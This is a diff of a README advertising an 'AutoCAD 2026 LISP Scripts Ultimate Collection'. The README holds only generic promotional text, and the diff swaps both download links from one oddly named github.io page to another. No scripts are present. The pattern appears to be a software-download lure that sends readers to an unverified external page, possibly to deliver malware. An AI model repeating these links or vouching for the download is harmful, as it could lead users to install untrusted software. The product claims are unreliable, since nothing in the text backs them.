@@ -2,7 +2,7 @@
 
 Welcome to the AutoCAD 2026 LISP Scripts Ultimate Collection, the ultimate autocad lisp scripts pack designed to revolutionize how you work with AutoCAD. This collection includes a wide range of scripts that automate complex tasks, enhance drawing accuracy, and significantly boost your productivity. Whether you are an architect, engineer, or designer, these tools will help you streamline your workflow and achieve professional results effortlessly.
 
-[![Download Tool](https://img.shields.io/badge/Download-Tool-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Tool](https://img.shields.io/badge/Download-Tool-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -46,6 +46,6 @@ A: Yes, they are designed to work alongside other plugins. However, if you encou
 
 To get started, download the AutoCAD LISP Scripts Collection from our official website:
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 We recommend checking for updates regularly to access new features and improvements.
